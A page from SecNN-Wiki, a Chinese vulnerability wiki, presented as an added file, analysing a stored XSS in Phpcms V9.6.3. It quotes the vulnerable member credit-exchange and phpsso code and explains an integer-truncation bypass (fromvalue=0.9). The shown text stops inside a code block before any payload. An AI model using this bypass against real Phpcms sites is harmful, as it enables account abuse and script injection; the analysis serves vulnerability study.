@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Phpcms/Phpcms%20V9.6.3%20%E5%82%A8%E5%AD%98%E5%9E%8Bxss/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Phpcms V9.6.3 储存型xss - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Phpcms V9.6.3 \u50a8\u5b58\u578bxss", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Phpcms%20V9.6.3%20%E5%89%8D%E5%8F%B0getshell/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 前台getshell
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Phpcms%20V9.6.3%20install.php%20%E6%B2%A1%E6%9C%89%E5%8D%B3%E4%BD%BF%E5%88%A0%E9%99%A4%E5%AF%BC%E8%87%B4%E7%9A%84getshell/" class="btn btn-xs btn-link">
+        Phpcms V9.6.3 install.php 没有即使删除导致的getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="phpcms-v963-xss">Phpcms V9.6.3 储存型xss<a class="headerlink" href="#phpcms-v963-xss" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Phpcms V9.6.3</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>问题出在会员的积分兑换功能，文件：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">/</span><span class="n">phpcms</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="n">member</span><span class="o">/</span><span class="nf">index</span><span class="p">.</span><span class="n">php</span>
+<span class="w"> </span><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">change_credit</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="err">$</span><span class="n">memberinfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">memberinfo</span><span class="p">;</span>
+<span class="w">  </span><span class="c1">//加载用户模块配置</span>
+<span class="w">  </span><span class="err">$</span><span class="n">member_setting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getcache</span><span class="p">(</span><span class="s">&#39;member_setting&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_init_phpsso</span><span class="p">();</span>
+<span class="w">  </span><span class="err">$</span><span class="n">setting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">client</span><span class="o">-&gt;</span><span class="n">ps_getcreditlist</span><span class="p">();</span>
+<span class="w">  </span><span class="err">$</span><span class="n">outcredit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unserialize</span><span class="p">(</span><span class="err">$</span><span class="n">setting</span><span class="p">);</span>
+<span class="w">  </span><span class="err">$</span><span class="n">setting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">client</span><span class="o">-&gt;</span><span class="n">ps_getapplist</span><span class="p">();</span>
+<span class="w">  </span><span class="err">$</span><span class="n">applist</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">unserialize</span><span class="p">(</span><span class="err">$</span><span class="n">setting</span><span class="p">);</span>
+
+<span class="w">  </span><span class="nf">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s">&#39;dosubmit&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="c1">//本系统积分兑换数</span>
+<span class="w">   </span><span class="err">$</span><span class="n">fromvalue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s">&#39;fromvalue&#39;</span><span class="p">]);</span>
+<span class="w">   </span><span class="c1">//本系统积分类型</span>
+<span class="w">   </span><span class="err">$</span><span class="n">from</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s">&#39;from&#39;</span><span class="p">];</span>
+<span class="w">   </span><span class="err">$</span><span class="n">toappid_to</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">explode</span><span class="p">(</span><span class="s">&#39;_&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s">&#39;to&#39;</span><span class="p">]);</span><span class="w">      </span><span class="c1">//这个是问题的参数</span>
+<span class="w">   </span><span class="c1">//目标系统appid</span>
+<span class="w">   </span><span class="err">$</span><span class="n">toappid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">toappid_to</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="w">   </span><span class="c1">//目标系统积分类型</span>
+<span class="w">   </span><span class="err">$</span><span class="n">to</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">toappid_to</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+<span class="w">   </span><span class="nf">if</span><span class="p">(</span><span class="err">$</span><span class="n">from</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nf">if</span><span class="p">(</span><span class="err">$</span><span class="n">memberinfo</span><span class="p">[</span><span class="s">&#39;point&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="err">$</span><span class="n">fromvalue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s">&#39;need_more_point&#39;</span><span class="p">),</span><span class="w"> </span><span class="n">HTTP_REFERER</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">   </span><span class="p">}</span><span class="w"> </span><span class="n">elseif</span><span class="p">(</span><span class="err">$</span><span class="n">from</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nf">if</span><span class="p">(</span><span class="err">$</span><span class="n">memberinfo</span><span class="p">[</span><span class="s">&#39;amount&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="err">$</span><span class="n">fromvalue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s">&#39;need_more_amount&#39;</span><span class="p">),</span><span class="w"> </span><span class="n">HTTP_REFERER</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">   </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">showmessage</span><span class="p">(</span><span class="n">L</span><span class="p">(</span><span class="s">&#39;credit_setting_error&#39;</span><span class="p">),</span><span class="w"> </span><span class="n">HTTP_REFERER</span><span class="p">);</span>
+<span class="w">   </span><span class="p">}</span>
+
+<span class="w">   </span><span class="err">$</span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">client</span><span class="o">-&gt;</span><span class="n">ps_changecredit</span><span class="p">(</span><span class="err">$</span><span class="n">memberinfo</span><span class="p">[</span><span class="s">&#39;phpssouid&#39;</span><span class="p">],</span><span class="w"> </span><span class="err">$</span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">toappid</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">to</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">fromvalue</span><span class="p">);</span>
+</code></pre></div>
+
+<p>这里有个问题，由于<code>if($memberinfo['point'] &lt; $fromvalue)</code>所以，<code>$fromvalue</code>不能大于会员的点数，但是没充值的状态下，点数是为0的，但是又由于上面有<code>intval($fromvalue)</code>，所以我们可以<code>$fromvalue=0.9</code>经过<code>intval</code>后就成了<code>0</code>，也就绕过了上面的逻辑。跟进<code>ps_changecredit</code>函数：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">ps_changecredit</span><span class="p">(</span><span class="err">$</span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">toappid</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">to</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">credit</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_ps_send</span><span class="p">(</span><span class="s">&#39;changecredit&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s">&#39;uid&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">uid</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;from&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">from</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;toappid&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">toappid</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;to&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">to</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;credit&#39;</span><span class="o">=&gt;</span><span class="err">$</span><span class="n">credit</span><span class="p">));</span>
+<span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+
+<p>继续跟进<code>_ps_send</code>函数：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">private</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">_ps_send</span><span class="p">(</span><span class="err">$</span><span class="n">action</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_ps_post</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">ps_api_url</span><span class="p">.</span><span class="s">&quot;/index.php?m=phpsso&amp;c=index&amp;a=&quot;</span><span class="p">.</span><span class="err">$</span><span class="n">action</span><span class="p">,</span><span class="w"> </span><span class="mi">500000</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">auth_data</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">));</span>
+<span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+
+<p>最后是经过<code>auth_data</code>函数处理和加密，<code>auth_data</code>调用<code>sys_auth</code>加密函数进行加密:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="kr">function</span><span class="w"> </span><span class="n">auth_data</span><span class="p">(</span><span class="err">$</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="err">$</span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">sep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
+<span class="w">  </span><span class="n">foreach</span><span class="p">(</span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="err">$</span><span class="n">k</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">$</span><span class="n">v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="nf">if</span><span class="p">(</span><span class="n">is_array</span><span class="p">(</span><span class="err">$</span><span class="n">v</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="err">$</span><span class="n">s2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">sep2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">foreach</span><span class="p">(</span><span class="err">$</span><span class="n">v</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="err">$</span><span class="n">k2</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">$</span><span class="n">v2</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="err">$</span><span class="n">s2</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s">&quot;$sep2{$k}[$k2]=&quot;</span><span class="p">.</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_ps_stripslashes</span><span class="p">(</span><span class="err">$</span><span class="n">v2</span><span class="p">);</span>
+<span class="w">     </span><span class="err">$</span><span class="n">sep2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#39;&amp;&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="err">$</span><span class="n">s</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">sep</span><span class="p">.</span><span class="err">$</span><span class="n">s2</span><span class="p">;</span>
+<span class="w">   </span><span class="p">}</span><span class="w"> </span><span class="n">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="err">$</span><span class="n">s</span><span class="w"> </span><span class="p">.</span><span class="o">=</span><span class="w"> </span><span class="s">&quot;$sep$k=&quot;</span><span class="p">.</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">_ps_stripslashes</span><span class="p">(</span><span class="err">$</span><span class="n">v</span><span class="p">);</span>
+<span class="w">   </span><span class="p">}</span>
+<span class="w">   </span><span class="err">$</span><span class="n">sep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#39;&amp;&#39;</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="err">$</span><span class="n">auth_s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#39;v=&#39;</span><span class="p">.</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">ps_vsersion</span><span class="p">.</span><span class="s">&#39;&amp;appid=&#39;</span><span class="p">.</span><span class="n">APPID</span><span class="p">.</span><span class="s">&#39;&amp;data=&#39;</span><span class="p">.</span><span class="n">urlencode</span><span class="p">(</span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">sys_auth</span><span class="p">(</span><span class="err">$</span><span class="n">s</span><span class="p">));</span>
+<span class="w">  </span><span class="kr">return</span><span class="w"> </span><span class="err">$</span><span class="n">auth_s</span><span class="p">;</span>
+<span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+
+<p><code>_ps_post</code>函数主要就是让服务器访问自己的网站上的一个地址也就是访问了<code>phpsso</code>的<code>changecredit</code>函数（方法）。我们先来看看<code>phpsso</code>：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">class</span><span class="w"> </span><span class="n">phpsso</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w"> </span><span class="n">public</span><span class="w"> </span><span class="o">$</span><span class="n">db</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">settings</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">applist</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">appid</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">;</span>
+<span class="w"> </span><span class="o">/**</span>
+<span class="w">  </span><span class="o">*</span><span class="w"> </span><span class="err">构造函数</span>
+<span class="w">  </span><span class="o">*/</span>
+<span class="w"> </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">__construct</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pc_base</span><span class="p">::</span><span class="n">load_model</span><span class="p">(</span><span class="s1">&#39;member_model&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="n">pc_base</span><span class="p">::</span><span class="n">load_app_func</span><span class="p">(</span><span class="s1">&#39;global&#39;</span><span class="p">);</span>
+
+<span class="w">  </span><span class="o">/*</span><span class="err">获取系统配置</span><span class="o">*/</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">settings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getcache</span><span class="p">(</span><span class="s1">&#39;settings&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">applist</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getcache</span><span class="p">(</span><span class="s1">&#39;applist&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">is_array</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">count</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">foreach</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="o">$</span><span class="n">k</span><span class="o">=&gt;$</span><span class="n">v</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">in_array</span><span class="p">(</span><span class="o">$</span><span class="n">k</span><span class="p">,</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s1">&#39;m&#39;</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="o">$</span><span class="n">k</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">v</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">   </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;appid&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">appid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intval</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;appid&#39;</span><span class="p">]);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">parse_str</span><span class="p">(</span><span class="n">sys_auth</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;DECODE&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">applist</span><span class="p">[</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">appid</span><span class="p">][</span><span class="s1">&#39;authkey&#39;</span><span class="p">]),</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
+
+
+<span class="n">parse_str</span><span class="p">(</span><span class="n">sys_auth</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;DECODE&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">applist</span><span class="p">[</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">appid</span><span class="p">][</span><span class="s1">&#39;authkey&#39;</span><span class="p">]),</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span><span class="err">可以看到是通过</span><span class="n">sys_auth函数解密</span><span class="err">（加密跟解密的函数是一样的）。</span>
+<span class="err">最后来看看</span><span class="n">changecredit</span><span class="err">：</span>
+<span class="w"> </span><span class="n">public</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">changecredit</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">uid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">])</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">toappid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;toappid&#39;</span><span class="p">])</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;toappid&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">from</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">])</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">to</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">])</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">credit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;credit&#39;</span><span class="p">])</span><span class="w"> </span><span class="err">?</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="s1">&#39;credit&#39;</span><span class="p">]</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">exit</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">);</span>
+<span class="w">  </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">appname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">applist</span><span class="p">[</span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">appid</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+<span class="w">  </span><span class="o">$</span><span class="n">outcredit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">getcredit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="w">  </span><span class="o">//</span><span class="err">目标系统积分增加数</span>
